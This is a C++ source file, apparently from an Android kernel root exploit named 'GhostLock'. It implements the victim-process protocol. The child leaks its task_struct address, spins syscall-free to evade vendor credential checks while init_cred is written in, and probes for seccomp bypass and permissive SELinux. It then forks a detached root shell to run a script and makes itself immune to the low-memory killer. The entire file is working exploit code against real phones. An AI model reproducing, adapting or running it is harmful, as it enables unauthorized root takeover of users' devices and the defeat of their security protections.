/*
 * GhostLock — victim process protocol: spawn, command pipe loop, root handoff.
 *
 * Split out of main.cpp; the statement order and log text are unchanged.
 */

#include "session/victim_process.hpp"

#include "attack/ops.hpp"
#include "kernel/constants.hpp"
#include "support/native_resource.hpp"

#include <array>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <cstring>

namespace ghostlock::session::victim {
    /* rooted exits kfree the static init_cred (w2 stores it with no
 * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
    static void park_child_process_forever(void) {
        support::UniqueFd adj(open("/proc/self/oom_score_adj", O_WRONLY | O_CLOEXEC));
        if (adj.valid()) {
            const char value[] = "-1000";
            (void) write(adj.get(), value, sizeof(value) - 1);
        }
        for (;;) pause();
    }

    /* Allocate the page the W2 spin protocol shares with the child. Failure is
     * not fatal: the stage falls back to the old blocked-read protocol. */
    static void alloc_spin_page(VictimContext &p) {
        p.release_spin_page();
        void *page = mmap(nullptr, sizeof(SpinPage), PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED) {
            pr_warning("victim spin: mmap failed errno=%d; using the blocked-read protocol\n",
                       errno);
            return;
        }
        auto *spin = static_cast<SpinPage *>(page);
        memset(spin, 0, sizeof(*spin));
        spin->cpu = kSpinCpuNone;
        p.spin = spin;
    }

    /* Child side: after the arm command, leave the kernel for the whole window.
     * Pinning and signal blocking happen first, while the task is unrooted; from
     * `spin_child_ready` until the release the loop makes no syscall, so a vendor
     * guard that compares credentials at syscall entry/exit sees nothing. */
    static void spin_for_release(VictimContext &p) {
        SpinPage *page = p.spin;
        if (page == nullptr) return;
        const uint32_t seq = spin_child_begin(page);

        /* The child inherited the forking thread's mask -- the native main
         * thread is pinned to the route's main CPU -- so the inherited mask is
         * not the allowed set. Widen it by trying each non-pair CPU: the cgroup
         * cpuset is the real bound, and the first success is the pin. */
        uint32_t chosen = kSpinCpuNone;
        const uint32_t main_cpu = page->main_cpu;
        const uint32_t consumer_cpu = page->consumer_cpu;
        /* 64 covers every Android SoC; the rest of CPU_SETSIZE never exists. */
        constexpr uint32_t kSpinMaxCpu = 64;
        for (uint32_t cpu = 0; cpu < kSpinMaxCpu; cpu++) {
            if (cpu == main_cpu || cpu == consumer_cpu) continue;
            cpu_set_t set;
            CPU_ZERO(&set);
            CPU_SET(static_cast<int32_t>(cpu), &set);
            if (sched_setaffinity(0, sizeof(set), &set) == 0) {
                chosen = cpu;
                break;
            }
        }
        if (chosen != kSpinCpuNone) {
            struct sched_param param{};
            param.sched_priority = 0;
            (void) sched_setscheduler(0, SCHED_IDLE, &param);
            (void) setpriority(PRIO_PROCESS, 0, 19);
        }

        /* A delivered signal would enter rt_sigreturn -- a syscall whose entry
         * and exit could straddle the credential write. */
        sigset_t all{};
        sigset_t old{};
        sigfillset(&all);
        const int32_t blocked = (sigprocmask(SIG_BLOCK, &all, &old) == 0);

        page->cpu = chosen;
        page->flags = (chosen != kSpinCpuNone) ? kSpinFlagPinned : kSpinFlagNoOffPairCpu;
        spin_child_ready(page, seq);
        while (spin_child_released(page, seq) == 0) {
            __asm__ volatile("" ::: "memory");
        }
        if (blocked) (void) sigprocmask(SIG_SETMASK, &old, nullptr);
    }

    static void child_main(VictimContext &p) {
        p.task_read.reset();
        p.cmd_write.reset();
        p.uid_read.reset();
        setpgid(0, 0); /* own group; the parent kills the whole tree on timeout */
        fcntl(p.uid_write.get(), F_SETFD, FD_CLOEXEC); /* keep the probe pipe out of the
                                          * root shell / ksud chain */
        prctl(PR_SET_NAME, "ghostleaf_0123456789");
        /* a real leak reproduces, a fluke vote winner does not. w2 writes to
     * this address, so two runs must agree or the leak is discarded. */
        uintptr_t my_task = attack::perf_find_task();
        int32_t leak_agreed = 0;
        for (int32_t i = 0; i < 2 && my_task; i++) {
            uintptr_t again = attack::perf_find_task();
            if (again == my_task) {
                leak_agreed = 1;
                break;
            }
            my_task = again;
        }
        if (!leak_agreed) my_task = 0;
        write(p.task_write.get(), &my_task, sizeof(my_task));
        p.task_write.reset();
        if (!my_task) _exit(1);
        char cmd;
        while (read(p.cmd_read.get(), &cmd, 1) == 1) {
            if (cmd == 'C') {
                uint32_t uid = getuid();
                write(p.uid_write.get(), &uid, sizeof(uid));
            } else if (cmd == 'F') {
                /* Forked finit_module probe after W3 cleared TIF_SECCOMP and
             * seccomp.mode: mode==2 re-arms TIF_SECCOMP on fork (probe hits the
             * filter); mode==0 lets it run filter-free to a normal errno. Forked
             * so SIGSYS costs only this. */
                uint32_t code = 0xffffffff;
                int32_t probe_pipe[2];
                if (pipe(probe_pipe) == 0) {
                    pid_t probe = fork();
                    if (probe == 0) {
                        close(probe_pipe[0]);
                        /* Forked probe: keep default SIGSYS so the filter kills it. */
                        signal(SIGSYS, SIG_DFL);
                        errno = 0;
                        long r = syscall(__NR_finit_module, 0, 0, 0);
                        uint32_t out = (r == 0) ? 0 : static_cast<uint32_t>errno;
                        ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
                        (void) nw;
                        _exit(0);
                    }
                    close(probe_pipe[1]);
                    int32_t st = 0;
                    if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
                        ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
                        if (nr != static_cast<ssize_t>(sizeof(code))) code = 0xfffffffe;
                    } else {
                        code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
                    }
                    close(probe_pipe[0]);
                }
                write(p.uid_write.get(), &code, sizeof(code));
            } else if (cmd == 'M') {
                /* Report comm length + first byte to tell which side a leaf=1 write
             * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
             * [target+8] len 8, untouched len 15. */
                std::array < char, 24 > comm{};
                support::UniqueFd cf(open("/proc/self/comm", O_RDONLY | O_CLOEXEC));
                if (cf.valid()) {
                    const ssize_t n = read(cf.get(), comm.data(), comm.size() - 1);
                    (void) n;
                }
                size_t len = strlen(comm.data());
                while (len > 0 && comm[len - 1] == '\n') {
                    comm[len - 1] = 0;
                    len--;
                }
                uint32_t report =
                        (static_cast<uint32_t>(len) << 8) | static_cast<uint32_t>(static_cast<unsigned char>(comm[0]));
                write(p.uid_write.get(), &report, sizeof(report));
            } else if (cmd == 'S') {
                spin_for_release(p);
            } else if (cmd == 'P') {
                /* w2 rooted this task; park */
                p.cmd_read.reset();
                p.uid_write.reset();
                park_child_process_forever();
            } else if (cmd == 'G' || cmd == 'X') {
                pr_info("handoff: root script path=%s\n", (config::runtime_config_snapshot().root_script_path.c_str()));
                break;
            }
        }
        p.cmd_read.reset();
        if (getuid() != 0) {
            p.uid_write.reset();
            _exit(1);
        }
        /* Don't leak app-side fds into the root shell chain: ksud/zygisk
     * daemons must not keep their write ends open. */
        /* Every live descriptor above stdio must not leak into the exec chain,
         * however high the soft limit goes; the old 1024 cutoff missed the
         * descriptors the spray opens past it. */
        int32_t fd_limit = 1024;
        struct rlimit nofile_limit{};
        if (getrlimit(RLIMIT_NOFILE, &nofile_limit) == 0 &&
            nofile_limit.rlim_cur != RLIM_INFINITY &&
            nofile_limit.rlim_cur <= static_cast<rlim_t>(1048576)) {
            fd_limit = static_cast<int32_t>(nofile_limit.rlim_cur);
        }
        for (int32_t fd = 3; fd < fd_limit; fd++) {
            int32_t fl = fcntl(fd, F_GETFD);
            if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
        }
        /* Pin the path in a stack buffer before fork/exec. The RuntimeConfig path
     * is now std::string-owned; passing its heap pointer straight into execl()
     * failed with EFAULT at the kernel boundary even though userspace could
     * print it, so the exec path must travel in process-stable stack storage. */
        std::array < char, 320 > script_path{};
        snprintf(script_path.data(), script_path.size(), "%s",
                 config::runtime_config_snapshot().root_script_path.c_str());
        pid_t worker = fork();
        if (worker == 0) {
            /* Detach into a brand-new session: the independent root shell owns the
         * whole chain (ksud late-load + module watch) and must survive the
         * exploit parent killing this group on timeout. */
            if (setsid() < 0) _exit(1);
            errno = 0;
            support::UniqueFd probe(open(script_path.data(), O_RDONLY | O_CLOEXEC));
            pr_info("handoff: script open fd=%d errno=%d path=%s\n", probe.get(), errno,
                    script_path.data());
            execl("/system/bin/sh", "sh", script_path.data(),
                  static_cast<char *>(nullptr));
            pr_warning("execl root script failed path=%s errno=%d\n",
                       script_path.data(), errno);
            _exit(1);
        }
        pr_info("handoff: root shell worker pid=%d\n", worker);
        if (worker < 0) {
            pr_warning("fork() for root shell failed errno=%d; parking rooted child\n", errno);
            p.uid_write.reset();
            park_child_process_forever();
        }
        /* the worker holds a fresh cred copy; this task holds the raw init_cred */
        p.uid_write.reset();
        park_child_process_forever();
    }

    /* The select route rebinds every fd < PSELECT_ROUTE_NFDS whose bit is set:
     * move the parent-held ends above that range. A failure fails the spawn --
     * fork() needs no descriptor, so the child would otherwise run unprotected. */
    static bool move_fd_above_route_range(support::UniqueFd &fd) {
        if (!fd.valid()) return true;
        const int32_t high = fcntl(fd.get(), F_DUPFD_CLOEXEC,
                                   static_cast<int32_t>(kernel::PSELECT_ROUTE_NFDS) + 64);
        if (high < 0) {
            pr_warning("protocol fd %d F_DUPFD failed errno=%d; not forking a "
                       "victim whose endpoint the route can clobber\n",
                       fd.get(), errno);
            return false;
        }
        fd.reset(high);
        return true;
    }

    static pid_t spawn_child(VictimContext &p) {
        std::array<int32_t, 2> p1{}, p2{}, p3{};
        alloc_spin_page(p);
        if (pipe(p1.data()) < 0 || pipe(p2.data()) < 0 || pipe(p3.data()) < 0) return -1;
        p.task_read.reset(p1[0]);
        p.task_write.reset(p1[1]);
        p.cmd_read.reset(p2[0]);
        p.cmd_write.reset(p2[1]);
        p.uid_read.reset(p3[0]);
        p.uid_write.reset(p3[1]);
        /* Parent-held ends must survive the route's fd clobber; the child-side
         * ends live in the child's own table and are unaffected. */
        if (!move_fd_above_route_range(p.task_read) ||
            !move_fd_above_route_range(p.cmd_write) ||
            !move_fd_above_route_range(p.uid_read)) {
            /* The descriptors stay with the context: a retry resets them. */
            return -1;
        }
        pid_t child = fork();
        if (child < 0) return -1;
        if (child == 0) {
            child_main(p);
            _exit(1);
        }
        p.task_write.reset();
        p.cmd_read.reset();
        p.uid_write.reset();
        p.set_child(child);
        return child;
    }

    /* Fork the victim and read back the task pointer perf leaked. */
    std::optional<VictimSpawn> spawn_victim(VictimContext &p) {
        pid_t child = spawn_child(p);
        if (child < 0) return std::nullopt;
        uintptr_t task = 0;
        ssize_t nr = read(p.task_read.get(), &task, sizeof(task));
        p.task_read.reset();
        const uintptr_t leaked = (nr == static_cast<ssize_t>(sizeof(task)))
                                     ? task
                                     : 0;
        return VictimSpawn{child, leaked};
    }

    /* Parent side of the spin. The child inherits the forking thread's mask --
     * the native main thread is pinned to the route's main CPU -- so the parent
     * only publishes the pair to avoid; the child widens its own affinity. */
    static int32_t spin_wait_for_arm(const SpinPage *page, uint32_t seq) {
        /* The child publishes armed before it starts spinning, so a healthy arm
         * is sub-millisecond; the bound covers a heavily preempted child. */
        constexpr int32_t kArmTimeoutMs = 2000;
        for (int32_t waited = 0; waited < kArmTimeoutMs; waited++) {
            if (spin_parent_armed(page, seq)) return 1;
            usleep(1000);
        }
        return 0;
    }

    int32_t arm_w2_spin(void *context) {
        auto *stage = static_cast<w2_stage_context *>(context);
        SpinPage *page = stage->pipes.spin;
        if (page == nullptr || stage->victim_dead) return 0;
        if (stage->spin_armed) return 1;
        const auto &cfg = config::runtime_config_snapshot();
        page->main_cpu = static_cast<uint32_t>(cfg.main_cpu);
        page->consumer_cpu = static_cast<uint32_t>(cfg.consumer_cpu);
        page->cpu = kSpinCpuNone;
        const uint32_t seq = spin_parent_arm(page);
        errno = 0;
        if (write(stage->pipes.cmd_write.get(), "S", 1) != 1) {
            const int32_t sent_errno = errno;
            if (sent_errno == EPIPE) {
                pr_warning("victim spin: arm command failed (errno=%d); the victim is gone\n",
                           sent_errno);
                stage->victim_dead = 1;
            } else {
                pr_warning("victim spin: arm command failed (errno=%d)\n", sent_errno);
            }
            return 0;
        }
        if (!spin_wait_for_arm(page, seq)) {
            pr_warning("victim spin: arm timeout\n");
            spin_parent_release(page, seq); /* never strand a late spin */
            return 0;
        }
        stage->spin_seq = seq;
        stage->spin_armed = 1;
        const uint32_t cpu = __atomic_load_n(&page->cpu, __ATOMIC_ACQUIRE);
        const uint32_t flags = __atomic_load_n(&page->flags, __ATOMIC_ACQUIRE);
        pr_info("victim spin: armed seq=%u cpu=%u flags=%u\n", seq, cpu, flags);
        return 1;
    }

    void release_victim_spin(w2_stage_context &stage) {
        SpinPage *page = stage.pipes.spin;
        if (page == nullptr || !stage.spin_armed) return;
        spin_parent_release(page, stage.spin_seq);
        stage.spin_armed = 0;
    }

    int32_t verify_selinux_stage(void *context) {
        (void) context;
        if (!attack::check_selinux_off()) return 0;
        pr_success("SELinux permissive\n");
        return 1;
    }

    int32_t verify_w2_stage(void *context) {
        auto *stage = static_cast<struct w2_stage_context *>(context);
        /* Both early returns here used to be silent, which made two different
         * failures indistinguishable in the log: a child that is dead (EPIPE on
         * the command, or a 0-byte reply) and a child that is alive but never
         * answers (a command written into a full pipe, or EAGAIN on a
         * non-blocking read). Every W2 failure in the rate-fix4 series read as
         * "no output between the round headers" -- two runs of the series were
         * spent on that ambiguity. errno is what tells them apart.
         *
         * A dead child is terminal for the stage: no later attempt can succeed,
         * and each one writes init_cred into a freed task_struct (the
         * 2026-11-22 Realme report). EOF and EPIPE both mean dead; anything
         * else is a live miss and re-arms the spin for the next attempt. */
        if (stage->victim_dead) return -1;

        /* Release first: the child's next syscall is the command read, whose
         * entry snapshot is taken after the credential write. */
        release_victim_spin(*stage);

        errno = 0;
        if (write(stage->pipes.cmd_write.get(), "C", 1) != 1) {
            const int32_t sent_errno = errno;
            if (sent_errno == EPIPE) {
                pr_warning("W2 verify: no command sent (errno=%d); the victim is gone\n",
                           sent_errno);
                stage->victim_dead = 1;
                return -1;
            }
            pr_warning("W2 verify: no command sent (errno=%d); the child is not consuming\n",
                       sent_errno);
            (void) arm_w2_spin(context);
            return 0;
        }

        uint32_t child_uid = 9999;
        errno = 0;
        const ssize_t got = read(stage->pipes.uid_read.get(), &child_uid, sizeof(child_uid));
        if (got == 0) {
            pr_warning("W2 verify: reply read 0 of %llu bytes; the victim is gone\n",
                       static_cast<unsigned long long>(sizeof(child_uid)));
            stage->victim_dead = 1;
            return -1;
        }
        if (got != static_cast<ssize_t>(sizeof(child_uid))) {
            pr_warning("W2 verify: reply read %lld of %llu bytes (errno=%d)\n",
                       static_cast<long long>(got),
                       static_cast<unsigned long long>(sizeof(child_uid)), errno);
            (void) arm_w2_spin(context);
            return 0;
        }
        pr_info("child uid = %u\n", child_uid);
        if (child_uid != 0) {
            (void) arm_w2_spin(context);
            return 0;
        }
        pr_success("child is root!\n");
        return 1;
    }

    int32_t verify_seccomp_probe_stage(void *context) {
        auto *stage = static_cast<struct w2_stage_context *>(context);
        if (write(stage->pipes.cmd_write.get(), "F", 1) != 1) return 0;

        uint32_t code = 0;
        if (read(stage->pipes.uid_read.get(), &code, sizeof(code)) !=
            static_cast<ssize_t>(sizeof(code))) {
            return 0;
        }
        pr_info("seccomp finit_module probe = 0x%x\n", code);
        /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
     * With init_cred + permissive SELinux a real probe fails with a normal
     * errno instead. */
        if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
            code == 1 || code == 38) {
            return 0;
        }
        pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
        return 1;
    }

    int32_t verify_leaf_dir_stage(void *context) {
        auto *stage = static_cast<struct w3_stage_context *>(context);
        if (write(stage->pipes.cmd_write.get(), "M", 1) != 1) return 0;

        uint32_t report = 0;
        if (read(stage->pipes.uid_read.get(), &report, sizeof(report)) !=
            static_cast<ssize_t>(sizeof(report))) {
            return 0;
        }
        size_t len = (report >> 8) & 0xff;
        unsigned char c0 = static_cast<unsigned char>(report & 0xff);
        pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned) len, c0);
        if (len == 8) {
            stage->leaf_to_target8 = 1;
            pr_info("leaf=1 write lands on [target+8]\n");
            return 1;
        }
        if (len == 0) {
            stage->leaf_to_target8 = 0;
            pr_info("leaf=1 write lands on [target]\n");
            return 1;
        }
        if (len == 15) {
            pr_warning("leaf dir probe: comm untouched (write missed the comm field)\n");
            return 0;
        }
        pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned) len, c0);
        return 0;
    }
} // namespace ghostlock::session::victim
